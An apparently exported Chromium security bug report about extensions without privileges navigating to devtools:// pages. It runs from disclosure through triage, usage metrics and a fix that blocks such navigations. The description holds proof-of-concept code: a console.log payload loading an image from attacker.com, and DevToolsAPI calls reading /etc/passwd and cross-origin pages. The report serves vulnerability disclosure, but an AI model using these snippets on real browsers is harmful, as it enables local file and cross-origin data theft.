# Extensions with no special privileges are allowed to navigate to devtools:// scheme pages.

| Field | Value |
|-------|-------|
| **Issue ID** | [40051448](https://issues.chromium.org/issues/40051448) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>Extensions |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | he...@gmail.com |
| **Assignee** | tj...@chromium.org |
| **Created** | 2020-02-05 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

It is possible to use the "ws" and "wss" parameters on the devtools://devtools/bundled/inspector.html endpoint to force it to connect to a malicious remote Chrome instance.

Afterwards, the Chrome instance can execute:  

console.log("%c", "background:url(<https://attacker.com/img.png>)");

Which will be reflected inside the privileged devtools:// page and execute the CSS. The image will also be rendered inside the page.

This can lead to the privileged process being compromised by a bug in the CSS parser / image parser.

Once the renderer process is compromised, the attacker would be able to run arbitrary javascript and read local files / cross-origin pages by leveraging the DevToolsAPI.

// Reading local files  

var data = "";

DevToolsAPI.streamWrite = function(id, chunk) {  

data += chunk;  

}

DevToolsAPI.sendMessageToEmbedder(  

"loadNetworkResource",  

[ "file:///etc/passwd", "", 0 ],  

function (result) {  

console.log(data);  

}  

);

// Reading cross-origin page  

var data = "";

DevToolsAPI.streamWrite = function(id, chunk) {  

data += chunk;  

}

DevToolsAPI.sendMessageToEmbedder(  

"loadNetworkResource",  

[ "https://www.google.com/", "", 0 ],  

function (result) {  

console.log(data);  

}  

);

Besides the ability to compromise the renderer, the attacker needs to have control over an extension without any privilege that is installed in the victim's browser since the devtools:// page can't normally be launched from the web.

I have also uploaded an unlisted video demonstrating the issue:  

<https://www.youtube.com/watch?v=ocwp40yZiM4>

**VERSION**  

Version 80.0.3987.87 (Official Build) (64-bit)

**REPRODUCTION CASE**

1. Run ./chrome --remote-debugging-port=9222 to simulate the attacker's browser instance.
2. Open <http://localhost:9222/json/new?https://lbherrera.github.io/lab/chrome/devtools/index.html>
3. Copy the ID of the page.
4. Download and unzip the extension.
5. Change the pageID variable in the "script.js" file to the ID you just retrieved.
6. Install the extension on your browser.
7. A new window should open automatically displaying an image rendered inside the devtools:// page.

**CREDIT INFORMATION**  

Reporter credit: Luan Herrera (@lbherrera\_)

## Attachments

- [devtools-extension.zip](attachments/devtools-extension.zip) (application/octet-stream, 799 B)

## Timeline

### ca...@chromium.org (2020-02-06)

It's unclear to me what the issue is here. If a user opens up devtools and connects to a remote debugging endpoint, the endpoint will be able to interact with devtools, so that part is working as intended, there are some mitigations in Chrome, such as not being able to open devtools:// links from other sites.

If you also have bugs that perform the "compromise the renderer by a bug in the CSS parser / image parser." those would be valid bugs, so please report them separately.

### he...@gmail.com (2020-02-06)

This issue describes an escalation of privilege that could be achieved when an attacker can compromise the renderer through a bug in the CSS parser / image parser since attacker-controlled data is being rendered inside a privileged page.

It is my understanding that a compromised renderer shouldn't be able to read cross-origin pages nor local files under Chrome's current security model.

As for the mitigation you talked about - in the report it is demonstrated that an extension without any permission can force the user to open devtools://

### ca...@chromium.org (2020-02-07)

It seems the issue here is that extensions can navigate to devtools://, since we don't otherwise allow navigations to that scheme. Otherwise I still think the inspector loading content written to the port it is connected to is working as intended. I'll reopen the bug and update the description. Labeling with medium severity since this requires an extension to be installed.

lazyboy: Can you further triage?

[Monorail components: Platform>DevTools Platform>Extensions]

### bm...@chromium.org (2020-02-07)

[Empty comment from Monorail migration]

### na...@chromium.org (2020-02-11)

[Empty comment from Monorail migration]

### [Deleted User] (2020-02-15)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-20)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-21)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 15 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-22)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 16 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-23)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 17 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-24)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 18 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-25)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 19 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-26)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 20 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-27)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 21 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-28)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 22 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-29)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 23 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-01)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 24 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-02)

lazyboy: Uh oh! This issue still open and hasn't been updated in the last 25 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### tv...@chromium.org (2020-03-02)

Benedikt, this issue has been sitting here for a while and I think this is a backend change. Could you maybe triage it, as lazyboy is unresponsive?

### bm...@chromium.org (2020-03-03)

This is not a DevTools issues, but rather an extension problem.

[Monorail components: -Platform>DevTools]

### [Deleted User] (2020-03-03)

rdcronin: Uh oh! This issue still open and hasn't been updated in the last 26 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-04)

rdcronin: Uh oh! This issue still open and hasn't been updated in the last 27 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-05)

rdcronin: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@chromium.org (2020-03-05)

Moving to Low severity as it attack requires that an attacker already controls an extension on the machine which opens up all sorts of other issues.

### [Deleted User] (2020-03-06)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rd...@chromium.org (2020-03-06)

We do allow extensions to navigate to more pages than on the web (e.g., chrome:-scheme pages), and this is important for some use cases.  I wonder if devtools is necessary, though.  I don't see a real compelling use case, but I could imagine some extensions allowing one-click debug or similar and opening up the inspector to a given page.

The first step here is probably gathering some UMA to see whether or not we could just disallow devtools:// navigations.  Tim, do you think you could take this on?

### ya...@chromium.org (2020-03-07)

[Comment Deleted]

### ya...@chromium.org (2020-03-07)

Extensions can use the Chrome DevTools protocol directly. I don't think opening DevTools UI is documented or has much value. I think it's rather dangerous.

We've had numerous user reports of DevTools annoyingly opening without their consent. We were wondering whether this was caused by extensions.

Let's disable this and wait for feedback?

### tj...@chromium.org (2020-03-13)

I threw together a small CL to add UMA logging for the different navigation paths. Do we still want to do that first or do we just want to outright block devtools scheme navigations?

### rd...@chromium.org (2020-03-19)

I'd feel a bit better with some UMA.  If it's as low as we expect, restricting the ability to navigate is really easy (we "just do it").  If it's surprisingly high (session managers?  One-click debuggers?  Etc), we may need a little bit more messaging.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/93d95f909dfc96de6508cbf518e179ab609fdff2

commit 93d95f909dfc96de6508cbf518e179ab609fdff2
Author: Tim Judkins <tjudkins@chromium.org>
Date: Fri Mar 27 22:42:57 2020

[Extensions] Log if an extension navigation URL has the devtools scheme.

Adds histogram logging to extension navigations caused by tabs.create,
tabs.update, windows.create and browser.openTab (the latter only being
used by apps), detecting if the URLs passed to those functions have the
devtools scheme.

Bug: 1049265
Change-Id: I7ac97e66ecf31d01d571936614a2d509deb6af9c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2102784
Reviewed-by: Alexei Svitkine <asvitkine@chromium.org>
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Commit-Queue: Tim Judkins <tjudkins@chromium.org>
Cr-Commit-Position: refs/heads/master@{#754198}

[modify] https://crrev.com/93d95f909dfc96de6508cbf518e179ab609fdff2/chrome/browser/extensions/api/tabs/tabs_api.cc
[modify] https://crrev.com/93d95f909dfc96de6508cbf518e179ab609fdff2/chrome/browser/extensions/extension_tab_util.cc
[modify] https://crrev.com/93d95f909dfc96de6508cbf518e179ab609fdff2/chrome/browser/extensions/extension_tab_util.h
[modify] https://crrev.com/93d95f909dfc96de6508cbf518e179ab609fdff2/tools/metrics/histograms/histograms.xml


### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### tj...@chromium.org (2020-05-08)

Checking in on this metric a few weeks on, there seem to be literally 0 logged API navigations to devtools scheme URLs. I had to double check that we were actually logging them correctly by triggering one locally and it does update the local chrome://histograms count.

Do we want to gather more data from stable, or are we good to just block these and pass back an error at this point?

### ya...@chromium.org (2020-05-08)

Thanks for this data!

Since we are already doing this, let's at least wait for Beta. Usage numbers for DevTools are generally fairly low for Dev and Canary when compared to Stable.

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-15)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### tj...@chromium.org (2020-08-31)

So checking in on this once again, on stable we average around 5K - 7K API navigations a week which have the devtools scheme. UMA graph can be seen here: https://uma.googleplex.com/timeline_v2?sid=53bd460d34d15879164a6a92f9749754#Extensions.UninstallType

Does that seem large enough to warrant some messaging around disabling this?

### ya...@chromium.org (2020-09-01)

I don't think we need special messaging. We also discussed offline that an extension with no "debugger" permission really has no business navigating to devtools://.

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### jd...@chromium.org (2020-11-23)

Gentle ping from a Security 👮‍♂️. What's the next step to keep this moving this to completion? Thanks!

### tj...@chromium.org (2020-11-23)

Thanks for the ping, I had been meaning to get back to this. Writing up the CL now.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-11-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5edf2d66fb5119961316c634161220e27c224252

commit 5edf2d66fb5119961316c634161220e27c224252
Author: Tim Judkins <tjudkins@chromium.org>
Date: Thu Nov 26 00:41:01 2020

[Extensions] Block extension API navigations to devtools scheme pages

This CL blocks extension API navigations to devtools scheme pages for
extensions which do not have either the devtools or debugger permission.

Bug: 1049265
Change-Id: I1db2847c9a15918b3557ec799810013c58a75108
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2555462
Commit-Queue: Tim Judkins <tjudkins@chromium.org>
Reviewed-by: Yang Guo <yangguo@chromium.org>
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#831189}

[modify] https://crrev.com/5edf2d66fb5119961316c634161220e27c224252/chrome/browser/extensions/api/tabs/tabs_constants.cc
[modify] https://crrev.com/5edf2d66fb5119961316c634161220e27c224252/chrome/browser/extensions/api/tabs/tabs_constants.h
[modify] https://crrev.com/5edf2d66fb5119961316c634161220e27c224252/chrome/browser/extensions/extension_tab_util.cc
[modify] https://crrev.com/5edf2d66fb5119961316c634161220e27c224252/chrome/browser/extensions/extension_tab_util_unittest.cc


### tj...@chromium.org (2020-11-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-26)

[Empty comment from Monorail migration]

### ad...@google.com (2020-12-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-12-03)

Thanks for the report. The VRP panel has decided to award $1000 for this bug.

### ad...@google.com (2020-12-04)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-02-26)

[Empty comment from Monorail migration]

### ad...@google.com (2021-03-02)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2021-03-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1049265?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051448)*
